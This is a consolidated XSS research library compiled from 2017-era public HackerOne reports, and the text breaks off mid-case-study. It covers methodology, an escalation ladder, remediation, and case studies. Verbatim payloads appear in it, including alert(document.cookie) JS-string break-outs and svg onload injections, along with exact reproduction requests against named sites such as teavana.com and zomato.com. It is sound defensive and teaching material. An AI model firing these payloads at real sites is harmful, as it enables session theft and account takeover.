---
title: "XSS Knowledge Base — Complete Edition"
type: consolidated
description: "All 10 playbooks plus the complete 562-source inventory, in one file."
archive_accessed: 2026-10-12
sources: 562
playbooks: 10
generated: "2026-10-12"
---

# XSS Knowledge Base — Complete Edition

> **ARCHIVED.** Flat concatenation of the 12 canonical files, for
> offline/single-file reading only. For *executing* a test, use
> [`XSS-Testing-Agent-Playbook.md`](../../XSS-Testing-Agent-Playbook.md).
> Edit the originals, not this file.

**This is the entire knowledge base in a single file.** It is a consolidation of the
following, which remain the canonical, individually navigable originals:

| File | Contents |
| --- | --- |
| `README.md` | Scope, category index, coverage, methodology, limitations, research gaps |
| `Reflected-XSS.md` | Flagship playbook — context analysis, escalation ladder, false-positive discipline |
| `Stored-XSS.md` | Cross-user execution, privilege escalation, admin-panel sinks |
| `DOM-Based-XSS.md` | Fragment/`postMessage`/storage sources, sink enumeration |
| `Context-Based-XSS.md` | The large "Generic XSS" bucket, re-sorted by context |
| `Filter-Bypass-and-Encoding.md` | Blocklist bypass, Unicode lookalikes, double encoding |
| `Framework-and-Template-XSS.md` | AngularJS / lodash-twine expression evaluation |
| `File-Upload-and-SVG-XSS.md` | `Content-Type` differentials, SVG, MIME sniffing |
| `Self-XSS.md` | Self-inflicted XSS as a defect indicator and chain component |
| `HTML-Injection.md` | The markup-without-script boundary; email/export sinks |
| `Browser-Extension-and-Messaging-XSS.md` | Extensions, `postMessage`, embedded-app SDKs |
| `references/source-index.md` | Complete 562-source inventory with case IDs |

**Reading note.** Section numbering restarts in each part; part boundaries are marked by
a horizontal rule and the part's own `#` title. Every case study carries a
`hackerone.com/reports/<id>` URL, so all citations resolve independently of this file.

---



---

<!-- PART 1 of 12 :: README.md -->

## XSS Knowledge Base

An evidence-based research library on Cross-Site Scripting, built from **562 public
HackerOne reports** indexed in [Nathan's HackerOne archive](https://h1.security.nathan.sx/),
spanning **80 programs**.

Every technical claim in the case studies is traceable to a specific report URL. Facts
extracted from reports are kept strictly separate from general methodology, and missing
data is marked *"Not disclosed in the source"* rather than filled in.

### Scope

**In scope.** Reflected, stored, DOM-based, and self XSS; context-based XSS (attribute,
JavaScript, URL, CSS, nested-parser); filter-bypass and encoding XSS; client-side and
server-side template injection with XSS impact; file-upload and SVG XSS; HTML injection;
browser-extension and `postMessage` XSS.

**Out of scope.** Server-side template injection reaching code execution (needs a
dedicated SSTI playbook — see [Research gaps](#research-gaps)); HTML injection not tied
to executable behaviour; general injection classes (SQLi, SSRF, CSRF) except where they
appear as chain components.

### Category index

| Playbook | Sources | Full bodies | Summary-only | What it covers |
| --- | ---: | ---: | ---: | --- |
| [`Reflected-XSS.md`](../../Reflected-XSS.md) | 85 | 48 | 37 | The flagship playbook. Context analysis, testing methodology, inert→executable escalation ladder, false-positive discipline. |
| [`Stored-XSS.md`](../../Stored-XSS.md) | 154 | 127 | 27 | Cross-user execution, privilege escalation, admin-panel sinks, second-account methodology. |
| [`DOM-Based-XSS.md`](../../DOM-Based-XSS.md) | 22 | 18 | 4 | Fragment/`postMessage`/storage sources, sink enumeration, origin validation. |
| [`Context-Based-XSS.md`](../../Context-Based-XSS.md) | 196 | 168 | 28 | The large "Generic XSS" bucket, re-sorted by context and trust boundary. Blind XSS, chains, embeds. |
| [`Filter-Bypass-and-Encoding.md`](../../Filter-Bypass-and-Encoding.md) | 38 | 38 | 0 | Blocklist bypass, Unicode lookalikes, double encoding, parser differentials. |
| [`Framework-and-Template-XSS.md`](../../Framework-and-Template-XSS.md) | 4 | 4 | 0 | AngularJS, lodash/twine expression evaluation; the arithmetic-probe technique. |
| [`File-Upload-and-SVG-XSS.md`](../../File-Upload-and-SVG-XSS.md) | 18 | 13 | 5 | `Content-Type` differentials, SVG allow-list bypasses, MIME sniffing, historical Flash. |
| [`Self-XSS.md`](../../Self-XSS.md) | 24 | 24 | 0 | Self-inflicted XSS as a defect indicator and chain component; URL-validation flaws. |
| [`HTML-Injection.md`](../../HTML-Injection.md) | 13 | 11 | 2 | The markup-without-script boundary; non-browser sinks (email, exports, logs). |
| [`Browser-Extension-and-Messaging-XSS.md`](../../Browser-Extension-and-Messaging-XSS.md) | 8 | 8 | 0 | Extension content scripts, `postMessage` origin/shape validation, embedded-app SDKs. |

Supporting documentation:

- [`references/source-index.md`](../../references/source-index.md) — the complete inventory.
  **Every one of the 562 sources has its own row**, mapped to its destination playbook.

### Report coverage

**Discovery.** The archive's main index contains 4,419 report rows. 910 matched an XSS
search term. 562 were curated as genuine XSS sources; the remaining 348 were excluded
because HackerOne's own weakness field classified them as CSRF, command injection,
crypto, CRLF, or resource issues, or because the title matched incidentally.

**Evidence quality.** Of the 562 curated sources:

| Evidence level | Count | Share |
| --- | ---: | ---: |
| Full report body retrieved | 459 | 81.7% |
| Partial — HackerOne's official team disclosure summary only | 103 | 18.3% |
| Title-only | 0 | — |

An earlier stage of the sweep retrieved **299 additional titles that are no longer
publicly accessible** (HTTP 404 from HackerOne). Those were dropped during curation
because no metadata was retrievable *and* they did not carry an XSS-indicative title.
They are listed by weakness field in
[`references/source-index.md`](../../references/source-index.md) § *Sources excluded from the
curated set*.

**Authoritative classification.** HackerOne's own weakness field, across the 562:

| Weakness                                 | Count |
| ---------------------------------------- | ----: |
| `Cross-site Scripting (XSS) - Generic`   |   514 |
| `Cross-site Scripting (XSS) - Stored`    |    22 |
| `Cross-site Scripting (XSS) - Reflected` |    19 |
| `Cross-site Scripting (XSS) - DOM`       |     7 |
|                                          |       |

That distribution is itself a finding: **91% of archived public XSS is filed as
"Generic."** "Generic" is an absence of classification, not a technique — which is why
[`Context-Based-XSS.md`](../../Context-Based-XSS.md) re-sorts that bucket by context rather
than passing it through.

**Published severity and bounty.** Recorded verbatim from HackerOne where available.
The strongest documented signal is Nextcloud `NC-SA-2017-008`
(`REFL-068`, <https://hackerone.com/reports/216812>): **CVSS v3 3.5
(AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N), CWE-79, rated low, $450** — the only archived XSS
case with a complete, sourced CVSS vector, a CWE identifier, a public advisory, and CVE
assignments (CVE-2017-0891).

### Methodology

1. **Archive inspection.** Fetched the archive index and parsed all 4,419 rows into a
   structured dataset (team, bounty, title, report URL). Confirmed that the archive's
   per-program pages carry **only** `Team | Bounty | Title` plus a link — no report
   bodies.
2. **Candidate identification.** Matched XSS search terms across all titles (reflected,
   stored, DOM, self, attribute/JS/URL context, encoding, double-encoding, filter
   bypass, SVG/file, template injection). 910 candidates.
3. **Authoritative retrieval.** For each candidate, retrieved the public, unauthenticated
   HackerOne report endpoint to obtain program, weakness, severity, bounty, dates,
   structured scope, official disclosure summary, and — where published — the full
   researcher report body.
4. **Curation.** Excluded 348 candidates whose HackerOne weakness field was a non-XSS
   class. Retained the rest regardless of how weak the title was, because the retrieved
   weakness field is more reliable than the title.
5. **Classification.** Backbone = HackerOne's authoritative weakness field
   (Reflected / Stored / DOM). The `Generic` bucket was then sub-classified by evidence
   in titles and report bodies into context, self, SVG/file, framework/template,
   extension/messaging, HTML injection, and filter-bypass groups.
6. **Consolidation.** Sources sharing a root cause were merged into one playbook with an
   individual case-study subsection each, retaining separate rows and separate citations
   in the source index.
7. **Authoring.** Playbooks were written from retrieved evidence. Methodology sections
   are labelled as general; case-study sections contain only sourced facts.

**Access and rate discipline.** `robots.txt` was checked (absent — GitHub Pages 404).
Requests were made at ~1.2 s intervals with 4xx responses not retried, and every fetched
page was cached to disk so the sweep was resumable. No authentication was used, no
access control was bypassed, and only public endpoints were read.

### Known source limitations

1. **The archive is frozen at 12 September 2017.** Every source predates the removal of
   Flash, the mainstreaming of strict CSP, and all modern XSS sinks. Modern
   exploitability of any case here has **not** been re-tested and must not be assumed.
2. **No report bodies for 103 sources.** HackerOne withheld the original text and
   published only the team's disclosure summary. Those sections state the summary and
   mark everything else as undisclosed.
3. **299 XSS-titled entries are gone entirely.** No metadata could be retrieved. Several
   are titled as reflected XSS and would likely strengthen the playbooks.
4. **Self-reported severities are not comparable.** The archive mixes HackerOne severity
   ratings, CVSS vectors, and raw bounty figures across programs with different policies
   and eras. No cross-program severity comparison is supportable and none is attempted.
5. **Classification of the `Generic` bucket is inferential.** No program published a
   per-context taxonomy, so the sub-classification in
   [`Context-Based-XSS.md`](../../Context-Based-XSS.md) was derived from titles and bodies.
6. **Several sources are truncated in the archive itself.** `CONT-185`'s summary ends
   mid-sentence at *"but cannot really…"*.
7. **Historical payloads should not be replayed.** Payloads in §11 of each playbook are
   reproduced verbatim for analysis, clearly marked, and are unsuitable for use against
   current targets. Newly authored illustrations are marked as such in every file.
8. **Payloads are evidence, not guidance.** No file here should be read as a
   ready-to-deploy attack resource; the `CONT-129` `.tar.gz` construction and the
   `FRAM-001` sandbox escape are retained solely to document what was reported.

### Research gaps

Ordered by likely value.

1. **No Server-Side Template Injection playbook — the largest gap.** The archive contains
   SSTI reports (Flask/Jinja2, Smarty) that reach **server-side code execution**. Those
   are outside an XSS knowledge base by the merge rule, and they need their own file.
2. **`REFL-082` (Rockstar double-encoding) body withheld.** Its decode sequence is
   labelled a hypothesis in [`Reflected-XSS.md`](../../Reflected-XSS.md) §2.3 and §14. This is
   the single highest-value missing document for the encoding playbook.
3. **`STOR-142`'s endpoint is undisclosed.** The filter defect is documented precisely;
   the location is not, so a targeted regression test cannot be built from it.
4. **Only 4 framework/template sources.** HackerOne has no template-injection-XSS
   category, so these are scattered in `Generic`. A sweep of report bodies for `{{`,
   `${`, `{%`, `{#` would likely double the evidence base.
5. **No post-2017 evidence whatsoever.** Modern DOM sinks, Trusted Types, MV3
   extensions, SSR framework injection, and mXSS are entirely uncovered.
6. **Unicode/filter soundness is unexamined.** Only two sources document normalisation
   behaviour. Whether a filter over NFC/NFKC/NFD can be relied on is unanswered.
7. **Origin-isolation claims are unverified.** Several reports assert a file subdomain is
   a "sandbox"; none tested whether cookies, storage, or service workers were reachable.
8. **Email and export sinks are barely mined.** One archived source
   ([`HTML-001`](../../HTML-Injection.md)) covers a phishing-grade HTML injection into an
   email sent from the target's own domain — a small, high-yield surface worth
   original research.
9. **`DOM-018`'s clone-able object shape is undocumented** in the accessible source,
   leaving the `postMessage` shape-bypass probe conceptual rather than concrete.

### Traceability

Every case study carries a report URL. The full chain:

````
h1.security.nathan.sx  →  per-program archive page  →  hackerone.com/reports/<id>
                                                          ↓
                                        source-index.md  →  Case ID  →  playbook §11
````

- [`references/source-index.md`](../../references/source-index.md) — 562 rows, each with case
  ID, original title, report URL, archive URL, program, date, category, evidence
  quality, destination playbook, and limitations.
- Each playbook's §11 uses stable **Case IDs** (`REFL-082`, `STOR-142`, …) that match
  the source index exactly.
- Facts not present in a retrieved source are written as *"Not disclosed in the source."*
  Hypotheses are explicitly labelled as such.



---

<!-- PART 2 of 12 :: Reflected-XSS.md -->

## Reflected XSS

### 1. Overview

A reflected XSS exists when an application takes attacker-controlled input from a
single HTTP request, and writes it into the response for that same request without
neutralising it for the output context in which it lands. The attacker's script then
executes in the origin of the target site, in the session of whoever loads the
crafted URL.

The technical substance of every reflected XSS reduces to three questions:

1. **Is the input reflected?** Where in the response does it appear?
2. **In what context?** HTML text, HTML attribute, JavaScript string, URL, CSS —
   the context determines which characters are dangerous.
3. **What was applied to it?** Nothing, `HTML-escaping`, `URL-encoding`,
   double-encoding, or a blocklist — and does that treatment match the context?

The 2017-era public reports in this knowledge base overwhelmingly failed at question
3: the value was reflected verbatim, or was passed through an encoder that did not
correspond to the context it landed in.

> **Scope note.** Sections 2–10 are generalised methodology. They are derived from
> the recurring patterns in the cited case studies but are not themselves claims
> about any specific report. Section 11 contains the only report-specific facts, and
> each of those is traceable to a URL in
> [`references/source-index.md`](../../references/source-index.md).

### 2. Root Cause and Technical Mechanics

The classic reflected flow:

````
attacker crafts URL  →  victim requests it  →  server reflects parameter
                     →  browser parses response  →  script executes in target origin
````

Three distinct root causes account for nearly every case in this archive:

#### 2.1 No output encoding at all

The parameter value is concatenated straight into the template. Moneybird's backend
search reflected `search_query` into an HTML attribute without enclosing quotes
([REFL-025](https://hackerone.com/reports/136600)).

#### 2.2 Encoding that does not match the context

This is the most instructive and most common failure. The application *did* encode —
but used the wrong encoder, or used HTML encoding in a JavaScript context.

`REFL-056` (Teavana, Starbucks program) is the canonical example. The `LocaleID`
parameter was placed inside a single-quoted JavaScript string literal, and the server
did not escape the single quote:

````js
var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';
````

The researcher, David Aurelius, stated the cause directly: *"the contents before the
`_CA` are not validated and it will be injected in the response"* — and further noted
that the same primitive yielded an open redirect by controlling `uri`.

`REFL-024` (Mapbox, `api.tiles.mapbox.com`) placed the `access_token` parameter into
an HTML text position. The payload `'.htaccess.aspx'><script>alert(document.domain)</script>`
worked because neither `>` nor `<` was encoded for the HTML context.

#### 2.3 Double encoding

`REFL-082` (Rockstar Games, `support.rockstargames.com`) is the one report in this
archive whose *entire* subject is encoding-layer mismatch. The official disclosure
summary states:

> "This exploit worked by using double-encoding to bypass our filters."

The mechanism: a filter decodes the input, finds nothing dangerous, and re-emits the
still-encoded form; the response then delivers the encoded form, which the browser
decodes once more into live markup. Rockstar classified it
`Cross-site Scripting (XSS) - Reflected`, severity `medium`, `$500`,
disclosed 2017-09-01.

> **Author's note — hypothesis, not sourced fact.** The archive does not publish the
> original body for REFL-082 (HackerOne withheld it; only the team summary is
> public). The decode-encode-redecode reasoning above is the standard explanation for
> this bug class and is offered as a testing hypothesis, not as a documented finding.

#### 2.4 Why reflection alone is not a vulnerability

Reflection is a *necessary* condition, not a sufficient one. Every entry in this
archive's index that proved not to be exploitable had reflection plus something else
wrong: the value landed inside a text node where `<` was already escaped, or landed
in a context where a quote could not be broken out of, or the CSP genuinely blocked
execution. See §9.

### 3. Attack Surface and Preconditions

Reflected XSS is usually reached through:

- **Query string parameters** — search boxes, filters, category and locale selectors,
  pagination. The single richest source in this archive.
- **Path segments** — `api.tiles.mapbox.com/v4/{map}/page.html`.
- **Fragments** — `LEASEWEB` (`DOM-005`) and `Veris` (`BROW-004`) both read the
  fragment client-side; see [`DOM-Based-XSS.md`](../../DOM-Based-XSS.md).
- **Marketing/tracking parameters** — `utm_campaign` on `getrush.uber.com`
  (`CONT-126`, `$3,000`) was the entire bug: an unescaped campaign tracker reflected
  into the page.
- **Error pages** — `REFL-068` (Nextcloud, `NC-SA-2017-008`) was the notable
  instance; see §9 for why Nextcloud rated it `low`.
- **Third-party embeds** — `REFL-023` (Livefyre Media Wall on `newsroom.uber.com`,
  `$2,000`) let an attacker point a `lf-content` parameter at their own JSON endpoint,
  which the embed then rendered. The XSS lived in an attacker-hosted origin but
  executed in the trusted one.

**Preconditions in every case:** the victim must load an attacker-controlled link.
That is the defining victim interaction of the class, and the reason real-world
exploitation leans on chat, mail, and link shorteners.

### 4. Manual Testing Methodology

1. **Map inputs first.** For each request, enumerate query, path, and cookie inputs.
   Reflected XSS lives in GET-reachable, unauthenticated, link-shareable surfaces, so
   prioritise those.
2. **Confirm reflection.** Use a unique inert marker (`H1XSSMARKER9`) and locate it in
   the raw response with `grep`, then in the rendered DOM with DevTools search. If the
   marker is absent, stop — there is no reflected XSS here.
3. **Determine context before choosing a payload.** Inspect the byte immediately
   before and after the marker. This single step prevents most wasted effort.
4. **Neutralise the context, not the whole document.** Prefer the smallest character
   needed to escape the specific context.
5. **Escalate from inert to executable in two stages.** First prove markup control
   with a harmless tag (`<h1>` / `<marquee>`), then prove script execution. Report both
   stages; many programs accept markup injection at lower severity and full script
   execution at higher.
6. **Record the exact reflection point.** Quote the raw response snippet in the report.

Two case studies demonstrate stage 1 and stage 2 handled properly, and both are
worth reading as models:

- `179426` (Blockchain) used only `<h1>XSS here` and `<marquee>XSS here`. The
  researcher explicitly noted that a strict CSP blocked arbitrary script and declined
  to overclaim: *"arbitrary javascript cannot be executed through this vulnerability
  without some CSP bypass."*
- `136600` (Moneybird) used `search_query=test" onclick=alert(document.domain)` —
  a single quote plus an event handler — and explained precisely why: *"the searchvalue
  is not enclosed in Quotes… so it is possible to inject any eventhandler."*

### 5. Input and Output Context Analysis

| Context | Dangerous characters | Correct control | Observed failure in this archive |
| --- | --- | --- | --- |
| HTML text node | `<` `>` | `&lt;` `&gt;` | `REFL-024`, `REFL-078` |
| HTML attribute (quoted) | `"` `'` | `&quot;` `&#39;` | `REFL-025` (unquoted attr) |
| HTML attribute (unquoted) | space, `>`, `` ` ``, `=`, `/` | quote the attribute **and** escape | `REFL-025` |
| JS string (single-quoted) | `'` `\` newline | `JSON.stringify` / `\u0027` | `REFL-056` |
| JS string (double-quoted) | `"` `\` newline | `JSON.stringify` | — |
| URL / `href` | `javascript:`, `data:`, whitespace | scheme allow-list | `CONT-057`, `BROW-008` |
| Comment | `--` `>` | strip comments server-side | — |

`REFL-025` is worth dwelling on because it shows the difference between *escaping*
and *quoting*. The value was not escaped, but the defect that mattered was that the
attribute was **unquoted** — so a space alone terminates the attribute value and any
subsequent token becomes a new attribute. Adding quotes would have neutralised the
payload without any escaping at all.

`CONT-057` (Twitter, `unsafe_link_warning`, `$1,400`) is the URL-context case:
`unsafe_link` was reflected into markup and the payload
`http://example.com onmouseover=alert(1) style=font-size:100pt` broke out with an
unquoted event handler. The researcher noted it was *"blocked by CSP"* in Firefox and
Chrome and demonstrated it in IE only.

`BROW-008` (Shopify, `$800`) is the URL-context case with a trust twist: a malicious
embedded app set a button `href` to a `javascript:` URL, which executed in the **store
admin's** session. See
[`Browser-Extension-and-Messaging-XSS.md`](../../Browser-Extension-and-Messaging-XSS.md).

### 6. Test Cases and Proof-of-Concepts

#### 6.1 Historical payloads (verbatim from the cited reports)

These are reproduced exactly as the original researchers submitted them, for
understanding. **Do not fire these at production targets.**

| Case | Report | Payload as submitted |
| --- | --- | --- |
| REFL-056 | `190798` | `LocaleID=eas';alert(document.cookie);//an_CA` |
| REFL-024 | `135217` | `access_token=...htaccess.aspx'><script>alert(document.domain)</script>` |
| REFL-025 | `136600` | `search_query=test" onclick=alert(document.domain)` |
| REFL-078 | `230119` | `category="--><%2Fscript><svg%2Fonload%3D'%3Balert(document.domain)%3B'>` |
| CONT-126 | `125112` | `utm_campaign=tttttt'%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E` |
| CONT-057 | `53098` | `unsafe_link=http://example.com onmouseover=alert(1) style=font-size:100pt` |

#### 6.2 Newly authored illustrations (not from the archive)

These are generic, written for this playbook, and use inert markers by design.

Context-probe markers — confirm reflection and locate the context without
introducing script:

````
H1XSSMARKER9
"><h1>xss-marker
'><svg onload=alert(1)>          ← attribute break-out
';alert(document.domain);//       ← single-quoted JS string break-out
");alert(document.domain);//      ← double-quoted JS string break-out
javascript:alert(1)//             ← URL / href context
````

Escalation ladder — test in this order, stop at the first rung that works, and report
the highest rung you reached:

| Rung | Test | Establishes |
| --- | --- | --- |
| 0 | `H1XSSMARKER9` | reflection exists |
| 1 | `"><h1>xss-marker` | markup control |
| 2 | `"><img src=x onerror=alert(1)>` | attribute/event-handler injection |
| 3 | `</script><svg onload=alert(1)>` | tag/context break-out |
| 4 | read a same-origin secret | confirmed origin-level impact |

**Safe proof preference.** Rung 4 — reading a same-origin value such as
`document.domain`, or setting a marker on a page you control — is far stronger
evidence than a bare `alert(1)` and is much less likely to disrupt the target. Several
researchers in this archive used `document.domain` or `document.cookie` rather than a
bare alert for exactly that reason.

### 7. Encoding, Filtering, and Parsing Behavior

The 2017 reports document four distinct filtering strategies and three distinct ways
each failed:

1. **No filtering.** `REFL-056`, `REFL-024`, `CONT-126`.
2. **HTML-escaped, wrong context.** Escaping `<`/`>` inside a JavaScript string does
   nothing about `'`, so the string can still be terminated. `REFL-056`.
3. **Incomplete blocklist.** Two Rockstar reports show how a blocklist fails on
   near-miss characters. In `STOR-142` the team's own words: *"we were not filtering
   ＜ and ＞ characters the same as `<` and `>`."* In `STOR-143`: *"certain obscure
   characters were not being converted to HTML entities properly."* Both are in
   [`Stored-XSS.md`](../../Stored-XSS.md) but the lesson is identical for reflected input.
4. **Double encoding.** `REFL-082`.

`REFL-017` (Shopify `wholesale.shopify.com`) shows a researcher proposing a fix that
is **not recommended today**: *"I suggest to convert them either to hex values or
escape them."* Hex-encoding is a blacklist-shaped answer. Prefer a vetted
context-appropriate encoder, applied at the point of output, for every value, always.

> **Note.** These sources are from 2017 or earlier. Browser parsing has changed
> substantially since — notably the removal of Flash, the near-universal adoption of
> `Content-Security-Policy`, and the closing of many legacy IE-specific parser quirks.
> Behaviour that depended on IE is flagged in §9.

### 8. Impact and Severity Considerations

Impact is determined by the **origin** in which the script executes, not by the
payload. An XSS on `support.rockstargames.com` inherits the trust users place in
Rockstar's support domain even where no sensitive cookie exists.

Recorded severities from the archive, quoted as published:

| Report | Program | HackerOne severity | Bounty |
| --- | --- | --- | --- |
| `246505` REFL-082 | Rockstar Games | medium | $500 |
| `230119` REFL-078 | Zomato | medium | not disclosed |
| `216812` REFL-068 | Nextcloud | low | $450 |
| `190798` REFL-056 | Starbucks | medium | not disclosed |
| `179426` HTML-008 | Blockchain | medium | not disclosed |

`REFL-068` deserves attention as a **severity-restraint model**. Nextcloud's own
disclosure gives **CVSS v3 3.5 (AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)**, CWE-79,
**low** — and explains why:

> "Nextcloud employs a strict Content-Security-Policy preventing exploitation of this
> XSS issue on modern web browsers."

The researcher had already conceded the same point, writing that "inject scripts or
redirect to another websites is difficult" given the headers in place. The bounty was
still paid. Accurate impact statements survive triage; inflated ones do not.

Two escalation factors recur and are worth stating in any report:

- **Admin panels.** `REFL-068`'s same flaw class in an admin panel is materially more
  severe than in a public page.
- **Session cookie value.** Where no session cookie exists on the vulnerable origin,
  say so plainly. The `191380` researcher volunteered exactly this, noting
  *"ton.twitter.com has no valuable cookies at all so the impact will be a phishing
  page"* — an honest self-limiting statement that should be copied, not hidden.

### 9. False Positives and Limitations

Disciplines the archive itself demonstrates.

**Reflection is not XSS.** Confirm the reflection is in an *executable-capable*
position. Reflection inside a properly escaped text node is not a finding.

**CSP genuinely blocking execution.** `179426` (Blockchain) reported a strict CSP that
"even blocks 'self'" and explicitly declined to claim script execution. `53098`
(CONT-057) reported the bug as IE-only and noted CSP protection elsewhere. Reporting
the limitation *raised* credibility in this archive rather than lowering it.

**The Nextcloud case — headers as mitigation, not as excuse.** `REFL-068` is instructive
because Nextcloud chose to both fix the escaping *and* publish the CSP mitigation. The
researcher's framing is worth reusing: headers reduce exploitability, they do not
remove the defect, and "not all browsers support these headers."

**Non-persistent, non-fatal.** Reflected XSS does not survive the request. Do not
claim persistence.

**Browser and era caveats.** Several reports depend on Internet Explorer specifically:
`REFL-001` (Slack, `slack.com/go/...`, `$150`) states *"can be reproduce in IE"*;
`CONT-057` required IE; `HTML-012` (`200826`) supplied a *separate* PoC "for Internet
Explorer (using X-UA-Compatible IE=9)" alongside a Chrome/IE HTML-injection PoC. Do not
assume 2017 IE-specific parser behaviour still applies. Verify on a current browser
before reporting, and if you cannot, state the constraint.

**Rate of non-reproduction in this archive.** Of 910 XSS-titled archive entries, 299
were no longer publicly retrievable at research time. Where only an official summary
was available, this playbook records the summary and marks the missing fields rather
than inferring them.

### 10. Remediation and Regression Testing

#### 10.1 Remediation, by context

| Context | Fix |
| --- | --- |
| HTML text | HTML-encode `& < > " '` at output |
| HTML attribute | Prefer never building attributes from concatenation; use a DOM API. Otherwise encode `& < > " '` |
| JavaScript string | Do **not** hand-roll. Set via `textContent`, or `JSON.stringify()` the value into a `<script type="application/json">` block and parse it |
| URL / `href` | Scheme allow-list (`https:`, `http:`, `mailto:`). Reject `javascript:`, `data:`, `vbscript:` after decoding, trimming whitespace and control characters |
| Anywhere | Validate input against an expected *shape* (format, regex, enum) — but never as a substitute for output encoding |

Fix at the point of output, for every value, unconditionally. Centralised, well-audited
encoding helpers are what actually hold; ad-hoc per-field fixes do not.

#### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| For every user-controlled output point, submit a context-breaking payload and assert the *escaped* form appears | encoding is present |
| Assert the payload never appears in the response in raw `<`/`>`/`'`/`"` form | no raw reflection |
| Assert the response is not reflected into any `<script>` block unescaped | JS-context safety |
| Assert `href`/`src` reject `javascript:` and `data:` | URL-context safety |
| Assert response carries a CSP without `unsafe-inline` | defence in depth |
| Assert cookies on authenticated paths are `HttpOnly` + `Secure` + `SameSite` | limits session theft |

#### 10.3 CSP as defence in depth, not the fix

`179426` and `REFL-068` both show CSP meaningfully reducing real-world impact. Neither
treats it as a remedy for the escaping defect, and neither should a report or a fix.

### 11. Historical Bug Bounty Case Studies

Each subsection below states only what the cited source states. Fields the source does
not disclose are marked as such. Full inventory:
[`references/source-index.md`](../../references/source-index.md).

---

#### REFL-082 — Reflected XSS via Double Encoding

- **Program:** Rockstar Games · **Report:** <https://hackerone.com/reports/246505>
- **Archive listing:** <https://h1.security.nathan.sx/rockstargames.html>
- **Published:** 2017-07-06 · **Disclosed:** 2017-09-01
- **Weakness (HackerOne):** `Cross-site Scripting (XSS) - Reflected`
- **Severity:** medium (author: Team) · **Bounty:** $500 · **Votes:** 22
- **Affected asset (structured scope):** `support.rockstargames.com` (asset type `URL`)
- **Body inspected:** No — withheld by HackerOne. Evidence level: **partial report**.

Official team disclosure summary, verbatim:

> "The researcher found a Reflected XSS vulnerability in the search query on
> support.rockstargames.com. This exploit worked by using double-encoding to bypass
> our filters. With the researcher's help we were able to resolve this vulnerability."

- Affected parameter: the **search query**. Not further disclosed.
- Reproduction: not disclosed in the accessible source.
- Remediation: "resolve this vulnerability" — no technical detail disclosed.
- **Why it matters here:** the only report in the archive whose entire subject is an
  encoding-layer mismatch, and therefore the anchor case for §7.

---

#### REFL-056 — Reflected XSS on teavana.com (Locale-Change)

- **Program:** Starbucks · **Report:** <https://hackerone.com/reports/190798>
- **Archive listing:** <https://h1.security.nathan.sx/starbucks.html>
- **Published:** 2016-12-13 · **Weakness:** `Cross-site Scripting (XSS) - Generic`
- **Severity:** medium · **Bounty:** Not disclosed in the source
- **Body inspected:** Yes. Evidence level: **full report**.

**Affected feature:** `Locale-Change`, parameter `LocaleID`, on `teavana.com` — a
Demandware storefront.

**Input-to-output flow (from the submitted raw response):** the value is embedded in a
single-quoted JavaScript string literal:

````js
var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';
uri = decodeURIComponent(uri);
if (uri.indexOf("/ca/en") >= 0) { uri = uri.replace("/ca/en", ""); }
else if (uri.indexOf("/ca/fr") >= 0) { uri = uri.replace("/ca/fr", ""); }
window.location = uri;
````

**Root cause, in the researcher's words:** "This injection is possible because the
contents before the `_CA` are not validated and it will be injected in the response."
The single quote is not escaped for the JS-string context it lands in.

**Reproduction (as submitted):**
````
GET /on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas';alert(1);//dasdsan_CA
Host: www.teavana.com
````

**Impact as claimed:** execution in the `teavana.com` origin; the researcher noted the
same primitive "can also be modified to easily make an open redirect" by controlling
the `uri` value that is finally passed to `window.location`.

**Limitations:** no bounty figure, no remediation detail, and no confirmation of
reproduction recorded in the accessible source.

---

#### REFL-025 — Reflected XSS in Backend search

- **Program:** Moneybird · **Report:** <https://hackerone.com/reports/136600>
- **Archive listing:** <https://h1.security.nathan.sx/moneybird.html>
- **Published:** 2016-05-05 · **Weakness:** `Cross-site Scripting (XSS) - Generic`
- **Severity / Bounty:** Not disclosed in the source
- **Body inspected:** Yes. Evidence level: **full report**.

**Root cause, in the researcher's words:** "This is possible, because the searchvalue
is not enclosed in Quotes… so it is possible to inject any eventhandler into the html
code." The `search_query` value is rendered into an **unquoted HTML attribute**.

**Reproduction (as submitted):**
1. Enable "view invoices online" and create an invoice containing a known word — this
   reveals the account ID needed to build the URL. The researcher flagged this
   dependency explicitly: *"this is just to see the id of the account to craft the
   payload. Maybe you can also find this number anywhere else…"*
2. Request:
   `https://moneybird.com/[id]/search?search_query=test" onclick=alert(document.domain)`
3. Click the search result — the alert fires.

**Preconditions:** an authenticated Moneybird account is required to reach backend
search; the attacker needs the victim's numeric account ID.

**Impact as claimed:** "the worst thing that you can do with this vulnerability, is to
redirect a moneybird user to a phishing page where he is prompted to enter his login
credentials, or an attacker could even add himself to the admins of the account and
take it over completely."

**Why it matters here:** the cleanest available demonstration that *quoting an
attribute* is itself a security control, independent of escaping.

---

#### REFL-078 — Reflected XSS in Zomato Mobile — category parameter

- **Program:** Zomato · **Report:** <https://hackerone.com/reports/230119>
- **Archive listing:** <https://h1.security.nathan.sx/zomato.html>
- **Published:** 2017-05-20 · **Weakness:** `Cross-site Scripting (XSS) - Reflected`
- **Severity:** medium · **Bounty:** Not disclosed in the source
- **Body inspected:** Yes. Evidence level: **full report**.

**Affected feature:** the `category` query parameter on restaurant photo pages,
reachable only when the request presents a **mobile user agent** (iPhone/Android).

**Preconditions / victim interaction:** victim must be on a mobile user agent and load
the crafted link.

**Reproduction (as submitted):**
````
https://www.zomato.com/manila/artsy-cafe-diliman-quezon-city/photos?category=%22--%3E%3C%2Fscript%3E%3Csvg%2Fonload%3D%27%3Balert%28document.domain%29%3B%27%3E
````

**Root cause:** the value is reflected into a position where `"` closes the surrounding
attribute and `</script>` terminates a preceding `<script>` block, after which a fresh
`<svg onload=...>` element executes.

**Limitations:** no remediation detail, bounty, or fix confirmation in the accessible
source.

---

#### REFL-024 — Reflected XSS on api.tiles.mapbox.com

- **Program:** Mapbox · **Report:** <https://hackerone.com/reports/135217>
- **Archive listing:** <https://h1.security.nathan.sx/mapbox.html>
- **Published:** recorded in the team summary as 2016-04-28 · **Severity:** Not
